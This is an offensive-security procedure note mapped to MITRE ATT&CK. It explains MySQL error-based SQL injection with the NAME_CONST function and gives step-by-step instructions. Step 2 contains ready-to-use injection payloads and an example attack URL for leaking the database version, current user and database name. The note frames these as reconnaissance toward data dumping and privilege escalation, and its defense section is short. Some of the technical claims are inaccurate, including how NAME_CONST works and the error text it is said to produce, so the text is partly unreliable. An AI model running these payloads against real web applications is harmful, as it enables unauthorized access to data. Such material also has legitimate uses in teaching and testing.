---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - mysql-injection
  - error-based-sqli
  - nameconst-function
commands:
  - '[[commands/mysql-check-version]]'
tools: []
platforms:
  - Web
  - MySQL
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# MySQL-Error-Based-Injection-Using-NAME_CONST

## Summary

This procedure demonstrates an error-based SQL injection attack targeting MySQL databases vulnerable to injection in parameters processed by the NAME_CONST function. It allows extraction of sensitive information such as the database version, current user, and database name by forcing database errors that reveal the data in error messages. This technique is useful in web applications where user input is not properly sanitized and directly influences SQL queries involving NAME_CONST.

## Description

Error-based SQL injection exploits vulnerabilities where unsanitized user input is concatenated into SQL queries, causing the database to throw errors that leak internal information. The NAME_CONST function in MySQL (available since version 5.0) is particularly exploitable because it assigns values to user-defined variables and can be manipulated to trigger errors when subqueries return unexpected results. By injecting a subquery that uses NAME_CONST to select constant values derived from system functions like version(), user(), and database(), an attacker can force the database to error out and display the computed values in the error message.

This attack is typically performed against web applications with a vulnerable endpoint, such as a search or ID parameter (e.g., ?id=1). It requires the application to display detailed MySQL error messages to the user. The technique chains multiple injections to gather reconnaissance data, which can inform further attacks like data exfiltration or privilege escalation. It maps to MITRE ATT&CK as exploitation of remote services for execution and collection of system information.

Target environment: Web applications backed by MySQL 5.0+. No direct database access needed; operates over HTTP requests to the vulnerable parameter.

## Requirements

1. A vulnerable web application endpoint susceptible to SQL injection (e.g., GET parameter like ?id=1 that influences a SELECT query).
2. MySQL database version 5.0 or higher (verified via preliminary check).
3. Knowledge of the injection point (identified via manual testing or tools like SQLMap).
4. Ability to intercept and modify HTTP requests (e.g., using a browser or proxy like Burp Suite).
5. Detailed error messages enabled on the target application (common in development or misconfigured production environments).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for all user inputs, using prepared statements or parameterized queries to prevent injection.
- Disable or limit detailed error message exposure in production; use generic error pages to avoid information leakage.
- Employ web application firewalls (WAFs) to detect and block common SQL injection patterns, including subquery manipulations.
- Regularly audit and patch MySQL installations; monitor database logs for anomalous queries involving NAME_CONST or error-generating subqueries.
- Use database activity monitoring (DAM) tools to alert on injection attempts based on query structure and error rates.

## Objectives

1. Verify MySQL version compatibility for the injection technique.
2. Extract the database version, current user, and database name via error messages.
3. Gather reconnaissance to support further SQL injection attacks, such as table enumeration or data dumping.
4. Achieve initial information disclosure without direct authentication to the database.

## Instructions

### Step 1: Verify MySQL Version Compatibility

**Context**: Before attempting the injection, confirm the target MySQL version is 5.0 or higher, as NAME_CONST exploitation relies on this feature. This step assumes access to a MySQL client or server-side check; if not, infer from application behavior or use the injection itself to extract version.

**Command** ([[commands/mysql-check-version]]):
```bash
mysql --version
```

> This command outputs the installed MySQL version. If run on the target server (e.g., via prior access), it directly confirms compatibility. Expected output includes something like "mysql  Ver 8.0.30 for Linux on x86_64 (MySQL Community Server - GPL)". If the version is below 5.0, the technique will fail—consider alternative error-based methods like EXTRACTVALUE or UPDATEXML.

### Step 2: Inject Payloads to Extract Database Information

**Context**: Target a vulnerable parameter (e.g., ?id=1) in the web application's URL. Append the injection payload to force a subquery error using NAME_CONST, which will leak the result of system functions in the error message. Test each payload sequentially to extract version, user, and database name. Use a proxy to capture the full error response.

**Code** ([[codes/mysql-nameconst-error-based-injection-queries]]):
```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

> Submit each payload via the vulnerable URL (e.g., http://target.com/page.php?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--). The database error should display the function output, such as "Incorrect arguments to NAME_CONST: '8.0.30'" for version(). Repeat for user() (e.g., "root@localhost") and database() (e.g., "webapp_db"). If no error leaks data, adjust the payload or confirm injection point. Success builds a profile of the database for advanced exploitation.
